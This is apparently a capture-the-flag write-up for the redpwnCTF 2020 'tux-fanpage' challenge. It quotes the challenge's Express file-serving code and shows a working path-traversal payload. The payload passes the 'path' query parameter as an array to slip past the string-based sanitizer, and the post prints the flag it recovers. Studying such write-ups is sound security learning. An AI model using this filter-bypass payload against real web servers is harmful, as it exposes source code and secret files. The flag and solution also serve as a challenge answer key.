---
layout: post
title: "tux-fanpage"
author: "shreyas-sriram"
---

My friend made a fanpage for Tux; can you steal the source code for me?

Site: `tux-fanpage.2020.redpwnc.tf`

## Files
* [index.js]({{site.baseurl}}/assets/tux-fanpage/index.js)

# Solution

* The source code `index.js` sanitizes the query parameter as seen here

```
app.get('/page', (req, res) => {

    let path = req.query.path

    //Handle queryless request
    if(!path || !strip(path)){
        res.redirect('/page?path=index.html')
        return
    }

    path = strip(path)

    path = preventTraversal(path)

    res.sendFile(prepare(path), (err) => {
        if(err){
            if (! res.headersSent) {
                try {
                    res.send(strip(req.query.path) + ' not found')
                } catch {
                    res.end()
                }
            }
        }
    })
})

//Prevent directory traversal attack
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}

//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}

//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}
```

* From the source code, it can be figured out that `./public/` is prepended to the query parameter
* Using the source code and elements in the page, it can be concluded that the required source code file `index.js` is in the same level as that of `/public`
* Payloads like `?path=../index.js` are being sanitized
* But notice that th sanitization code involves methods that are common to **strings** and **arrays**
* To bypass the filtering, an **array** need to be passed in the query parameters<br/>
`?path=a&path=/../../index.js`
* The first index has to be of `length = 1` to bypass the filter
* This is parsed as `path[] = [a,/../../index.js]`
* The URL to retrieve the source code will be<br/>
`https://tux-fanpage.2020.redpwnc.tf/page?path=a&path=/../../index.js`
* Find the flag in the source code<br/>
`flag{tr4v3rsal_Tim3}`
